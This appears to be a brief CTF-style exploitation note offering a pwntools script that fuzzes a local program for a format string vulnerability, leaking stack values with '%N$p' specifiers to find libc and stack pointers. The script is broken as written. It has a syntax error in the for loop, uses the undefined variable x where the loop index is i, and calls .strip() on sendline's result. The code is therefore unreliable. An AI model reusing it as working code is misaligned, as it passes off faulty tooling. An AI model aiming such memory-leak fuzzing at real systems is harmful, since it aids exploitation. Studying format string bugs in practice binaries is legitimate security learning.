# Fuzzer

Here is a fuzzer which I have written which can be used when a format string vulnerability is present. This will leak values off of the stack, and you can know which value they are. You can then check whether they're `libc` pointers or `stack` pointers etc.

```python
from pwn import *

binary = "program" # filename
fuzzer_range = 100 # Change which range you want

e = ELF(f"./{binary}") 
p = process(e.path)

for i in range(0, fuzzer_range)
    p.sendline(f"%{x}$p").strip()
    p.clean()
    try:
        leak = int(p.recvline(), 16)
        print(f"%{x}$p : {hex(leak)}")
    except:
        pass
```
